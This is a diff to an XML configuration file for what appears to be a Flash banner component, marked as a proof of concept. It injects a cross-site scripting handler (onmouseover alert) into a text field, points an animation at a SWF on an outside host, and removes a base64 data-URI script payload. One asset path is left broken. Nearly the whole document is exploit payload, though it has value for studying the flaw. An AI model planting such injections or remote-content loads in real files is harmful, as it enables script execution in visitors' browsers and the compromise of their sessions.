@@ -37,7 +37,7 @@
 	
 		<text id="1" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>THIS IS A POC</h1>]]></text>
 		<text id="2" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>THIS IS A POC</h1>]]></text>
-		<text id="3" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>THIS IS A POC</h1>]]></text>
+		<text id="3" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1 onmouseover='alert(document.domain)'>THIS IS A POC</h1>]]></text>
 		
 	</buttontext>
 	
@@ -57,9 +57,9 @@
 	<anims boxX="0" boxY="0" boxW="562" boxH="250" boxCol="0xffffff" lineCol="0xf6f3f3" lineWeight="1">
 	
 		<anim id="0" x="0" y="0" w="562" h="250" url="assets/intro.swf"/>
-		<anim id="1" x="0" y="0" w="562" h="250" url="home01.swf"/>
+		<anim id="1" x="0" y="0" w="562" h="250" url="http://red.tf/swf/home01.swf"/>
 		<anim id="2" x="0" y="0" w="562" h="250" url="assets/home02.swf"/>
-		<anim id="3" x="0" y="0" w="562" h="250" url="data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="/>	
+		<anim id="3" x="0" y="0" w="562" h="250" url="ssets/home03.swf"/>	
 		
 	</anims>
 	
